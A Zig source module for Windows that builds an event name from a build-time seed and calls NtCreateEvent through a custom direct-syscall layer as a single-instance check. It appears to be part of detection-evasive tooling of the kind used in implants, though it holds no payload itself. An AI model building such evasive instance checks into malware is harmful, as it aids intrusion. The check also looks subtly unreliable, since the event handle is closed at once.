const std = @import("std");
const types = @import("../types/types.zig");
const config = @import("config");
const hash = @import("../types/hash.zig");
const engine = @import("../syscalls/engine.zig");

fn deriveEventName(buf: *[64]u8) []u8 {
    const h = config.SEED;
    const hex = "0123456789ABCDEF";
    buf[0] = hex[(h >> 28) & 0xF];
    buf[1] = hex[(h >> 24) & 0xF];
    buf[2] = '-';
    buf[3] = hex[(h >> 20) & 0xF];
    buf[4] = hex[(h >> 16) & 0xF];
    buf[5] = '-';
    buf[6] = hex[(h >> 12) & 0xF];
    buf[7] = hex[(h >> 8) & 0xF];
    buf[8] = '-';
    buf[9] = hex[(h >> 4) & 0xF];
    buf[10] = hex[h & 0xF];
    return buf[0..11];
}

pub fn ensureMutex() bool {
    var name_buf: [64]u8 = undefined;
    const name = deriveEventName(&name_buf);

    var us_buf: [512]u16 = undefined;
    @memset(&us_buf, 0);
    for (name, 0..) |c, i| {
        us_buf[i] = c;
    }

    var us = types.UNICODE_STRING{
        .Length = @as(types.USHORT, @intCast(name.len * 2)),
        .MaximumLength = @as(types.USHORT, @intCast(us_buf.len * 2)),
        .Buffer = @as(types.PWSTR, @ptrCast(&us_buf)),
    };

    var oa = types.OBJECT_ATTRIBUTES{
        .Length = @sizeOf(types.OBJECT_ATTRIBUTES),
        .RootDirectory = null,
        .ObjectName = &us,
        .Attributes = types.OBJ_CASE_INSENSITIVE,
        .SecurityDescriptor = null,
        .SecurityQualityOfService = null,
    };

    var event_handle: types.HANDLE = undefined;
    const status = engine.NtCreateEvent(
        &event_handle,
        0x1F0003,
        @as(types.PVOID, @ptrCast(&oa)),
        @intFromEnum(types.EVENT_TYPE.NotificationEvent),
        0,
    );

    if (status == 0xC000004E) return false;
    if (status < 0) return false;
    _ = engine.NtClose(event_handle);
    return true;
}
